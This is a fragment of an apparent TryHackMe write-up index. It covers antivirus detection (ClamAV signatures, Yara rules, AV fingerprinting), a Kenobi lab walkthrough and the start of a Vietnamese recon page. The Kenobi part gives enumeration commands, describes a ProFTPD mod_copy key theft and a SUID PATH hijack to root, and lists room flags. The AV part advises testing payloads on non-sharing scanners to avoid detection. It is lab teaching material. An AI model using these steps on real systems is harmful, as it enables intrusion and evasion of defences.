closely check the generated MD5 value, 44d88612fea8a8f36de82e1278abb02f , it matches.","title":"Static Detection"},{"location":"tryhackme/room/l/introtoav/#create-your-own-signature-database","text":"One of ClamAV's features is creating your own database, allowing you to include items not found in the official ClamAV database. Let's try to create a signature for Backdoor 2, which ClamAV already missed, and add it to a database. The following are the required steps: Generate an MD5 signature for the file. Add the generated signature into a database with the extension \".hdb\". Re-scan the ClamAV against the file using our new database. First, we will be using the sigtool tool, which is included in the ClamAV suite, to generate an MD5 hash of backdoor2.exe using the --md5 argument. Generate an MD5 hash C :\\ Users \\ thm \\ Desktop \\ Samples > \"c:\\Program Files\\ClamAV\\sigtool.exe\" - -md5 backdoor2 . exe 75047189991b1d119fdb477fef333ceb : 6144 : backdoor2 . exe As shown in the output, the generated hash string contains the following structure: Hash:Size-in-byte:FileName . Note that ClamAV uses the generated value in the comparison during the scan. Now that we have the MD5 hash, now let's create our own database. We will use the sigtool tool and save the output into a file using the > thm.hdb as follows, Generate our new database C :\\ Users \\ thm \\ Desktop \\ Samples > \"c:\\Program Files\\ClamAV\\sigtool.exe\" - -md5 backdoor2 . exe > thm . hdb As a result, a thm.hdb file will be created in the current directory that executes the command. We already know that ClamAV did not detect the backdoor2.exe using the official database! Now, let's re-scan it using the database we created, thm.hdb , and see the result! Re-scanning backdoor2.exe using the new database! C :\\ Users \\ thm \\ Desktop \\ Samples > \"c:\\Program Files\\ClamAV\\clamscan.exe\" -d thm . hdb backdoor2 . exe Loading : 0s , ETA : 0s [========================>] 1 / 1 sigs Compiling : 0s , ETA : 0s [========================>] 10 / 10 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : backdoor2 . exe . UNOFFICIAL FOUND As we expected, the ClamAV tool flagged the backdoor2.exe binary as malicious based on the database we provided. As a practice, add the AV-Check.exe's MD5 signature into the same database we already created, then check whether ClamAV can flag AV-Check.exe as malicious.","title":"Create Your Own Signature Database"},{"location":"tryhackme/room/l/introtoav/#yara-rules-for-static-detection","text":"One of the tools that help in static detection is Yara . Yara is a tool that allows malware engineers to classify and detect malware. Yara uses rule-based detection, so in order to detect new malware, we need to create a new rule. ClamAV can also deal with Yara rules to detect malicious files. The rule will be the same as in our database in the previous section. To create a rule, we need to examine and analyze the malware; based on the findings, we write a rule. Let's take AV-Check.exe as an example and write a rule for it. First, let's analyze the file and list all human-readable strings in the binary using the strings tool. As a result, we will see all functions, variables, and nonsense strings. But, if you look closely, we can use some of the unique strings in our rules to detect this file in the future. The AV-Check uses a program database (.pdb), which contains a type and symbolic debugging information of the program during the compiling. Command Prompt C :\\ Users \\ thm \\ Desktop \\ Samples > strings AV-Check . exe | findstr pdb C :\\ Users \\ thm \\ source \\ repos \\ AV-Check \\ AV-Check \\ obj \\ Debug \\ AV-Check . pdb We will use the path in the previous command's output as our unique string example in the Yara rule that we will create. The signature could be something else in the real world, such as Registry keys, commands, etc. If you are not familiar with Yara, then we suggest checking the Yara THM room. The following is Yara's rule that we will use in our detection: rule thm_demo_rule { meta: author = \"THM: Intro-to-AV-Room\" description = \"Look at how the Yara rule works with ClamAV\" strings: $a = \"C:\\\\Users\\\\thm\\\\source\\\\repos\\\\AV-Check\\\\AV-Check\\\\obj\\\\Debug\\\\AV-Check.pdb\" condition: $a } Let's explain this Yara's rule a bit more. The rule starts with rule thm_demo_rule , which is the name of our rule. ClamAV uses this name if a rule matches. The metadata section, which is general information, contains the author and description, which the user can fill. The strings section contains the strings or bytecode that we are looking for. We are using the C# program's database path in this case. Notice that we add an extra in that path to escape the special character, so it does not break the rule. In the condition section, we specify if the defined string is found in the string section, then flag the file. Note that Yara rules must store in a .yara extension file for ClamAV to deal with it. Let's re-scan the c:\\Users\\thm\\Desktop\\Samples folder again using the Yara rule we created. You can find a copy of the Yara rule on the desktop at c:\\Users\\thm\\Desktop\\Files\\thm-demo-1.yara . Scanning using the Yara rule C :\\ Users \\ thm > \"c:\\Program Files\\ClamAV\\clamscan.exe\" -d Desktop \\ Files \\ thm-demo - 1 . yara Desktop \\ Samples Loading : 0s , ETA : 0s [========================>] 1 / 1 sigs Compiling : 0s , ETA : 0s [========================>] 40 / 40 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ AV-Check . exe : YARA . thm_demo_rule . UNOFFICIAL FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor1 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ notes . txt : YARA . thm_demo_rule . UNOFFICIAL FOUND As a result, ClamAV can detect the AV-Check.exe binary as malicious based on the Yara rule we provide. However, ClamAV gave a false-positive result where it flagged the notes.txt file as malicious. If we open the notes.txt file, we can see that the text contains the same path we specified in the rule. Let's improve our Yara rule to reduce the false-positive result. We will be specifying the file type in our rule. Often, the types of a file can be identified using magic numbers, which are the first two bytes of the binary. For example, executable files (.exe) always start with the ASCII \"MZ\" value or \"4D 5A\" in hex. To confirm this, let's use the HxD application, which is a freeware Hex Editor, to examine the AV-Check.exe binary and see the first two bytes. Note that the HxD is already available in the provided VM. Knowing this will help improve the detection, let's include this in our Yara rule to flag only the .exe files that contain our signature string as malicious. The following is the improved Yara rule: rule thm_demo_rule { meta: author = \"THM: Intro-to-AV-Room\" description = \"Look at how the Yara rule works with ClamAV\" strings: $a = \"C:\\\\Users\\\\thm\\\\source\\\\repos\\\\AV-Check\\\\AV-Check\\\\obj\\\\Debug\\\\AV-Check.pdb\" $b = \"MZ\" condition: $b at 0 and $a } In the new Yara rule, we defined a unique string ($b) equal to the MZ as an identifier for the .exe file type. We also updated the condition section, which now includes the following conditions: If the string \"MZ\" is found at the 0 location, the file's beginning. If the unique string (the path) occurs within the binary. In the condition section, we used the AND operator for both definitions in 1 and 2 are found, then we have a match. You can find the updated rule in Desktop\\Files\\thm-demo-2.yara . Now that we have our updated Yara rule, now let's try it again. Scanning using the Yara rule C :\\ Users \\ thm > \"c:\\Program Files\\ClamAV\\clamscan.exe\" -d Desktop \\ Files \\ thm-demo - 2 . yara Desktop \\ Samples Loading : 0s , ETA : 0s [========================>] 1 / 1 sigs Compiling : 0s , ETA : 0s [========================>] 40 / 40 tasks C :\\ Users \\ thm \\ Desktop \\ Samples \\ AV-Check . exe : YARA . thm_demo_rule . UNOFFICIAL FOUND C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor1 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ backdoor2 . exe : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ eicar . com : OK C :\\ Users \\ thm \\ Desktop \\ Samples \\ notes . txt : OK Answer the questions bellow Question: What is the sigtool tool output to generate an MD5 of the AV-Check.exe binary? Ans: f4a974b0cf25dca7fbce8701b7ab3a88:6144:AV-Check.exe Question: Use the strings tool to list all human-readable strings of the AV-Check binary. What is the flag? Ans: THM{Y0uC4nC-5tr16s}","title":"Yara Rules for Static Detection"},{"location":"tryhackme/room/l/introtoav/#task-6-other-detection-techniques","text":"The concept of static detection is relatively simple. In this section, we will discuss the different types of detection techniques.","title":"Task 6: Other Detection Techniques"},{"location":"tryhackme/room/l/introtoav/#dynamic-detection","text":"The dynamic detection approach is advanced and more complicated than static detection. Dynamic detection is focused more on checking files at runtime using different methods. The following diagram shows the dynamic detection scanning flow: The first method is by monitoring Windows APIs. The detection engine inspects Windows application calls and monitors Windows API calls using Windows Hooks . Another method for dynamic detection is Sandboxing. A sandbox is a virtualized environment used to run malicious files separated from the host computer. This is usually done in an isolated environment, and the primary goal is to analyze how the malicious software acts in the system. Once the malicious software is confirmed, a unique signature and rule will be created based on the characteristic of the binary. Finally, a new update will be pushed into the cloud database for future use. This type of detection also has drawbacks because it requires executing and running the malicious software for a limited time in the virtual environment to protect the system resources. As with other detection techniques, dynamic detection can be bypassed. Malware developers implement their software to not work within the virtual or simulated environment to avoid dynamic analysis. For example, they check if the system spawns a real process of executing the software before running malicious activities or let the software wait sometime before execution. For more information about sandbox evasion, we suggest checking the THM room: Sandbox Evasion!","title":"Dynamic Detection"},{"location":"tryhackme/room/l/introtoav/#heuristic-and-behavioral-detection","text":"Heuristic and behavioral detection have become essential in today's modern AV products. Modern AV software relies on this type of detection to detect malicious software. The heuristic analysis uses various techniques, including static and dynamic heuristic methods: Static Heuristic Analysis is a process of decompiling (if possible) and extracting the source code of the malicious software. Then, the extracted source code is compared to other well-known virus source codes. These source codes are previously known and predefined in a heuristic database. If a match meets or exceeds a threshold percentage, the code is flagged as malicious. Dynamic Heuristic Analysis is based on predefined behavioral rules. Security researchers analyzed suspicious software in isolated and secured environments. Based on their findings, they flagged the software as malicious. Then, behavioral rules are created to match the software's malicious activities within a target machine. The following are examples of behavioral rules: If a process tries to interact with the LSASS.exe process that contains users' NTLM hashes, Kerberos tickets, and more If a process opens a listening port and waits to receive commands from a Command and Control (C2) server The following diagram shows the Heuristic and behavioral detection scanning flow:","title":"Heuristic and Behavioral Detection"},{"location":"tryhackme/room/l/introtoav/#summing-up-detection-methods","text":"Let's summarize how modern AV software works as one unit, including all components, and combines various features and detection techniques to implement its AV engine. The following is an example of the components of an antivirus engine: In the diagram, you can see a suspicious Foobar.zip file is passed to AV software to scan. AV software recognizes that it is a compressed file (.zip). Since the software supports .zip files, it applies an un-archiver feature to extract the files ( Foobar.exe ). Next, it identifies the file type to know which module to work with and then performs a PE parsing operation to pull the binary's information and other characteristic features. Next, it checks whether the file is packed; if it is, it unpacks the code. Finally, it passes the collected information and the binary to the AV engine, where it tries to detect if it is malicious and gives us the result. Answer the questions bellow Question: Which detection method is used to analyze malicious software inside virtual environments? Ans: Dynamic Detection","title":"Summing up detection methods"},{"location":"tryhackme/room/l/introtoav/#task-7-av-testing-and-fingerprinting","text":"","title":"Task 7: AV Testing and Fingerprinting"},{"location":"tryhackme/room/l/introtoav/#av-vendors","text":"Many AV vendors in the market mainly focus on implementing a security product for home or enterprise users. Modern AV software has improved and now combines antivirus capabilities with other security features such as Firewall, Encryption, Anti-spam, EDR, vulnerability scanning, VPN, etc. It is important to note that it is hard to recommend which AV software is the best. It all comes down to user preferences and experience. Nowadays, AV vendors focus on business security in addition to end-user security. We suggest checking the AV comparatives website for more details on enterprise AV vendors.","title":"AV Vendors"},{"location":"tryhackme/room/l/introtoav/#av-testing-environment","text":"AV testing environments are a great place to check suspicious or malicious files. You can upload files to get them scanned against various AV software vendors. Moreover, platforms such as VirusTotal use various techniques and provide results within seconds. As a red teamer or a pentester, we must test a payload against the most well-known AV applications to check the effectiveness of the bypass technique.","title":"AV Testing Environment"},{"location":"tryhackme/room/l/introtoav/#virustotal","text":"VirusTotal is a well-known web-based scanning platform for checking suspicious files. It allows users to upload files to be scanned with over 70 antivirus detection engines. VirusTotal passes the uploaded files to the Antivirus engines to be checked, returns the result, and reports whether it is malicious or not. Many checkpoints are applied, including checking for blacklisted URLs or services, signatures, binary analysis, behavioral analysis, as well as checking for API calls. In addition, the binary will be run and checked in a simulated and isolated environment for better results. For more information and to check other features, you may visit the VirusTotal website.","title":"VirusTotal"},{"location":"tryhackme/room/l/introtoav/#virustotal-alternatives","text":"Important Note : VirusTotal is a handy scanning platform with great features, but it has a sharing policy. All scanned results will be passed and shared with antivirus vendors to improve their products and update their databases for known malware. As a red teamer, this will burn a dropper or a payload you use in engagements. Thus, alternative solutions are available for testing against various security product vendors, and the most important advantage is that they do not have a sharing policy. However, there are other limitations. You will have a limited number of files to scan per day; otherwise, a subscription is needed for unlimited testing. For those reasons, we recommend you only test your malware on sites that do not share information, such as: AntiscanMe (6 free scans a day) Virus Scan Jotti's malware scan","title":"VirusTotal alternatives"},{"location":"tryhackme/room/l/introtoav/#fingerprinting-av-software","text":"As a red teamer, we do not know what AV software is in place once we gain initial access to a target machine. Therefore, it is important to find and identify what host-based security products are installed, including AV software. AV fingerprinting is an essential process to determine which AV vendor is present. Knowing which AV software is installed is also quite helpful in creating the same environment to test bypass techniques. This section introduces different ways to look at and identify antivirus software based on static artifacts, including service names, process names, domain names, registry keys, and filesystems. The following table contains well-known and commonly used AV software. Antivirus Name Service Name Process Name Microsoft Defender WinDefend MSMpEng.exe Trend Micro TMBMSRV TMBMSRV.exe Avira AntivirService, Avira.ServiceHost avguard.exe, Avira.ServiceHost.exe Bitdefender VSSERV bdagent.exe, vsserv.exe Kaspersky AVP<Version #> avp.exe, ksde.exe AVG AVG Antivirus AVGSvc.exe Norton Norton Security NortonSecurity.exe McAfee McAPExe, Mfemms MCAPExe.exe, mfemms.exe Panda PavPrSvr PavPrSvr.exe Avast Avast Antivirus afwServ.exe, AvastSvc.exe","title":"Fingerprinting AV software"},{"location":"tryhackme/room/l/introtoav/#sharpedrchecker","text":"One way to fingerprint AV is by using public tools such as SharpEDRChecker . It is written in C# and performs various checks on a target machine, including checks for AV software, like running processes, files' metadata, loaded DLL files, Registry keys, services, directories, and files. We have pre-downloaded the SharpEDRChecker from the GitHub repo so that we can use it in the attached VM. Now we need to compile the project, and we have already created a shortcut to the project on the desktop (SharpEDRChecker). To do so, double-click on it to open it in Microsoft Visual Studio 2022. Now that we have our project ready, we need to compile it, as shown in the following screenshot: Once it is compiled, we can find the path of the compiled version in the output section, as highlighted in step 3. We also added a copy of the compiled version in the C:\\Users\\thm\\Desktop\\Files directory. Now let's try to run it and see the result as follows: Command Prompt! C :\\> SharpEDRChecker . exe SharpEDRChecker's Summary [!] Directory Summary : [-] C :\\ Program Files \\ Windows Defender : defender [-] C :\\ Program Files \\ Windows Defender Advanced Threat Protection : defender , threat [-] C :\\ Program Files ( x86 )\\ Windows Defender : defender [!] Service Summary : [-] PsShutdownSvc : sysinternal [-] Sense : defender , threat [-] WdNisSvc : defender , nissrv [-] WinDefend : antimalware , defender , malware , msmpeng [-] wscsvc : antivirus As a result, the Windows Defender is found based on folders and services. Note that this program may be flagged by AV software as malicious since it does various checks and APIs calls.","title":"SharpEDRChecker"},{"location":"tryhackme/room/l/introtoav/#c-fingerprint-checks","text":"Another way to enumerate AV software is by coding our own program. We have prepared a C# program in the provided Windows 10 Pro VM, so we can do some hands-on experiments! You can find the project's icon on the desktop (AV-Check) and double-click it to open it using Microsoft Visual Studio 2022. The following C# code is straightforward, and its primary goal is to determine whether AV software is installed based on a predefined list of well-known AV applications. using System ; using System.Management ; internal class Program { static void Main ( string [] args ) { var status = false ; Console . WriteLine ( \"[+] Antivirus check is running .. \" ); string [] AV_Check = { \"MsMpEng.exe\" , \"AdAwareService.exe\" , \"afwServ.exe\" , \"avguard.exe\" , \"AVGSvc.exe\" , \"bdagent.exe\" , \"BullGuardCore.exe\" , \"ekrn.exe\" , \"fshoster32.exe\" , \"GDScan.exe\" , \"avp.exe\" , \"K7CrvSvc.exe\" , \"McAPExe.exe\" , \"NortonSecurity.exe\" , \"PavFnSvr.exe\" , \"SavService.exe\" , \"EnterpriseService.exe\" , \"WRSA.exe\" , \"ZAPrivacyService.exe\" }; var searcher = new ManagementObjectSearcher ( \"select * from win32_process\" ); var processList = searcher . Get (); int i = 0 ; foreach ( var process in processList ) { int _index = Array . IndexOf ( AV_Check , process [ \"Name\" ]. ToString ()); if ( _index > - 1 ) { Console . WriteLine ( \"--AV Found: {0}\" , process [ \"Name\" ]. ToString ()); status = true ; } i ++ ; } if ( ! status ) { Console . WriteLine ( \"--AV software is not found!\" ); } } } Let's explain the code a bit more. We have predefined a list of well-known AV applications in the AV_Check array within our code, which is taken from the previous section, where we discussed fingerprinting AV software (table above). Then, we use the Windows Management Instrumentation Command-Line (WMIC) query ( select * from win32_process ) to list all currently running processes in the target machine and store them in the processList variable. Next, we go through the currently running processes and compare if they exist in the predefined array. If a match is found, then we have AV software installed. The C# program utilizes a WMIC object to list current running processes, which may be monitored by AV software. If AV software is poorly implemented to monitor the WMIC queries or Windows APIs, it may cause false-positive results in scanning our C# program. Let's compile an x86 version of the C# program, upload it to the VirusTotal website, and check the results! To compile the C# program in the Microsoft Visual Studio 2022, select Build from the bar menu and choose the Build Solution option. Then, if it complied correctly, you can find the path of the compiled version in the output section, as highlighted in step 3 in the screenshot below. If we upload the AV-Check program to the VirusTotal website and check the result, surprisingly, VirusTotal showed that two AV vendors (MaxSecure and SecureAge APEX) flagged our program as malicious! Thus, this is a false-positive result where it incorrectly identifies a file as malicious where it is not. One of the possible reasons is that these AV vendors' software uses a machine-learning classifier or rule-based detection method that is poorly implemented. For more details about the actual submission report, see here . There are four main sections: Detection, Details, Behavior, and Community. If we check the Behavior section, we can see all calls of Windows APIs, Registry keys, modules, and the WMIC query. In the Detection section, there are Sigma rules that, if a system event during execution is matched (in the sandbox environment), consider the file malicious. This result is likely based on the rules; VirusTotal flagged our program because of the Process Ghosting technique , as shown in the following screenshot. Now let's re-compile the C# program using an x64 CPU and check if the check engines act differently. In our submission attempt this time, three AV vendors' software (Cyren AV is added to the list) flagged the file as malicious. For more details about the actual submission report, look here . Note: if you try to submit a file to the VirusTotal website, it may give you a different result. Keep in mind that VirusTotal shares submission reports with the Antivirus vendors to improve their AV detection engines, including false-positive results. Answer the questions bellow Question: For the C# AV fingerprint, try to rewrite the code in a different language, such as Python, and check whether VirusTotal flag it as malicious. Ans: No answer needed Question: Read the Above! Ans: No answer needed","title":"C# Fingerprint checks"},{"location":"tryhackme/room/l/introtoav/#task-8-conclusion","text":"","title":"Task 8: Conclusion"},{"location":"tryhackme/room/l/introtoav/#recap","text":"In this room, we covered Antivirus software and its detection approaches. As a red teamer, it is important to know how AV software works and detects malicious applications to be able to implement bypass techniques. We also discussed the static detection technique in detail and showcased how ClamAV, an open-source Antivirus, detects malicious files using static analysis. Additionally, we showed how to create your own database and use Yara rules to detect malicious files that are not detected by the official database. Once we obtain access to a target, it is essential to enumerate the target machine before performing further actions, such as privilege escalation or lateral movement. The reason is to not trigger alerts for suspicious activities, which may cause losing access to the target machine. Thus, we introduced two methods to practice AV fingerprinting using public and private tools.","title":"Recap"},{"location":"tryhackme/room/l/introtoshells/","text":"","title":"Index"},{"location":"tryhackme/room/l/kenobi/","text":"Kenobi \u00b6 Task 1: Deploy the vulnerable machine \u00b6 This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary. Answer the questions bellow Question: Make sure you're connected to our network and deploy the machine Ans: No Answer Needed Question: Scan the machine with nmap, how many ports are open? Ans: 7 Task 2: Enumerating Samba for shares \u00b6 Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system. Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network. Answer the questions bellow Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares! nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP SMB has two ports, 445 and 139. Question: Using the nmap command above, how many shares have been found? Ans: 3 On most distributions of Linux smbclient is already installed. Lets inspect one of the shares. smbclient //MACHINE_IP/anonymous Using your machine, connect to the machines network share. Question: Once you're connected, list the files on the share. What is the file can you see? Ans: log.txt You can recursively download the SMB share too. Submit the username and password as nothing. smbget -R smb://MACHINE_IP/anonymous Open the file on the share. There is a few interesting things found. Information generated for Kenobi when generating an SSH key for the user Information about the ProFTPD server. What port is FTP running on? Ans: 21 Download file log Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP What mount can we see? Ans: /var Task 3: Gain initial access with ProFtpd \u00b6 ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions. Answer the questions bellow Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. Question: What is the version? Ans: 1.3.5 We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. Question: How many exploits are there for the ProFTPd running? Ans: 4 You should have found an exploit from ProFtpd's mod_copy module . The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. Ans: No answer needed We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory. Ans: No answer needed Lets mount the /var/tmp directory to our machine mkdir /mnt/kenobiNFS mount MACHINE_IP:/var /mnt/kenobiNFS ls -la /mnt/kenobiNFS We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account. Question: What is Kenobi's user flag (/home/kenobi/user.txt)? Ans: d0b0f3f53b6caa532a83915e19224899 Task 4: Privilege Escalation with Path Variable Manipulation \u00b6 Lets first understand what what SUID, SGID and Sticky Bits are. Permission On Files On Directories SUID Bit User executes the file with permissions of the file owner - SGID Bit User executes the file with the permission of the group owner. File created in directory gets the same group owner. Sticky Bit No meaning Users are prevented from deleting files from other users. Answer the questions bellow SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null Question: What file looks particularly out of the ordinary? Ans: /usr/bin/menu Question: Run the binary, how many options appear? Ans: 3 Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell. We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the \"curl\" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root! Ans: No needed answer Question: What is the root flag (/root/root.txt)? Ans: 177b3cd8562289f37382721c28381f02","title":"Kenobi"},{"location":"tryhackme/room/l/kenobi/#kenobi","text":"","title":"Kenobi"},{"location":"tryhackme/room/l/kenobi/#task-1-deploy-the-vulnerable-machine","text":"This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary. Answer the questions bellow Question: Make sure you're connected to our network and deploy the machine Ans: No Answer Needed Question: Scan the machine with nmap, how many ports are open? Ans: 7","title":"Task 1: Deploy the vulnerable machine"},{"location":"tryhackme/room/l/kenobi/#task-2-enumerating-samba-for-shares","text":"Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system. Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network. Answer the questions bellow Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares! nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP SMB has two ports, 445 and 139. Question: Using the nmap command above, how many shares have been found? Ans: 3 On most distributions of Linux smbclient is already installed. Lets inspect one of the shares. smbclient //MACHINE_IP/anonymous Using your machine, connect to the machines network share. Question: Once you're connected, list the files on the share. What is the file can you see? Ans: log.txt You can recursively download the SMB share too. Submit the username and password as nothing. smbget -R smb://MACHINE_IP/anonymous Open the file on the share. There is a few interesting things found. Information generated for Kenobi when generating an SSH key for the user Information about the ProFTPD server. What port is FTP running on? Ans: 21 Download file log Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP What mount can we see? Ans: /var","title":"Task 2: Enumerating Samba for shares"},{"location":"tryhackme/room/l/kenobi/#task-3-gain-initial-access-with-proftpd","text":"ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions. Answer the questions bellow Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. Question: What is the version? Ans: 1.3.5 We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. Question: How many exploits are there for the ProFTPd running? Ans: 4 You should have found an exploit from ProFtpd's mod_copy module . The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. Ans: No answer needed We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory. Ans: No answer needed Lets mount the /var/tmp directory to our machine mkdir /mnt/kenobiNFS mount MACHINE_IP:/var /mnt/kenobiNFS ls -la /mnt/kenobiNFS We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account. Question: What is Kenobi's user flag (/home/kenobi/user.txt)? Ans: d0b0f3f53b6caa532a83915e19224899","title":"Task 3: Gain initial access with ProFtpd"},{"location":"tryhackme/room/l/kenobi/#task-4-privilege-escalation-with-path-variable-manipulation","text":"Lets first understand what what SUID, SGID and Sticky Bits are. Permission On Files On Directories SUID Bit User executes the file with permissions of the file owner - SGID Bit User executes the file with the permission of the group owner. File created in directory gets the same group owner. Sticky Bit No meaning Users are prevented from deleting files from other users. Answer the questions bellow SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null Question: What file looks particularly out of the ordinary? Ans: /usr/bin/menu Question: Run the binary, how many options appear? Ans: 3 Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell. We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the \"curl\" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root! Ans: No needed answer Question: What is the root flag (/root/root.txt)? Ans: 177b3cd8562289f37382721c28381f02","title":"Task 4: Privilege Escalation with Path Variable Manipulation"},{"location":"tryhackme/room/l/red-team-reconnaissance/","tags":["THM-Room"],"text":"Init Access \u00b6 C\u00f3 m\u1ed9t c\u00e2u n\u00f3i r\u1ea5t hay \"Bi\u1ebft ng\u01b0\u1eddi bi\u1ebft ta, tr\u0103m tr\u1eadn tr\u0103m th\u1eafng\". \u0110\u1ea7u ti\u00ean khi ta b\u01b0\u1edbc v\u00e0o giai \u0111o\u1ea1n t\u1ea5n c\u00f4ng m\u1ed9t th\u1ee9 g\u00ec \u0111\u00f3 th\u00ec vi\u1ec7c hi\u1ec3u v\u1ec1 n\u00f3 th\u1ef1c s\u1ef1 c\u1ea7n thi\u1ebft. B\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o m\u1ed9t v\u00e0i k\u0129 thu\u1eadt do th\u00e1m t\u1eeb v\u1ecb tr\u00ed c\u1ee7a Redteam nh\u01b0 sau: Types of reconnaissance activities WHOIS and DNS-based reconnaissance Advanced searching Searching by image Google Hacking Specialized search engines Recon-ng Maltego Types of reconnaissance activities (c\u00e1c lo\u1ea1i trinh s\u00e1t) \u00b6 Trinh s\u00e1t c\u00f3 th\u1ec3 chia l\u00e0m 2 lo\u1ea1i: Trinh s\u00e1t b\u1ecb \u0111\u1ed9ng: C\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n b\u1eb1ng vi\u1ec7c quan s\u00e1t nh\u1eefng g\u00ec c\u00f3 s\u1eb5n \u1edf m\u1ee5c ti\u00eau ho\u1eb7c \u1edf b\u00ean th\u1ee9 ba cung c\u1ea5p (d\u00f9ng c\u00e1c k\u0129 thu\u1eadt nh\u01b0 OSINT \u0111\u1ec3 thu th\u1eadp th\u00f4ng tin, ... whois, nslookup, dig, shodan.io, DNSDumpster,...) Trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng: C\u1ea7n ch\u1ee7 \u0111\u1ed9ng, t\u01b0\u01a1ng t\u00e1c v\u1edbi m\u1ee5c ti\u00eau nh\u1eb1m xem ph\u1ea3n \u1ee9ng c\u1ee7a n\u00f3 (c\u00e1c c\u00f4ng c\u1ee5 \u0111\u01b0\u1ee3c d\u00f9ng nh\u01b0 netcat, ping, traceroute, telnet, ...). Trong trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng, c\u00f3 th\u1ec3 chia l\u00e0m 2 nh\u00e1nh ti\u1ebfp c\u1eadn sau: Trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau. Trinh s\u00e1t t\u1eeb b\u00ean trong: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean trong m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau Recon-ng l\u00e0 m\u1ed9t framework gi\u00fap t\u1ef1 \u0111\u1ed9ng h\u00f3a c\u00f4ng vi\u1ec7c OSINT. N\u00f3 s\u1eed d\u1ee5ng c\u00e1c m\u00f4-\u0111un t\u1eeb nhi\u1ec1u t\u00e1c 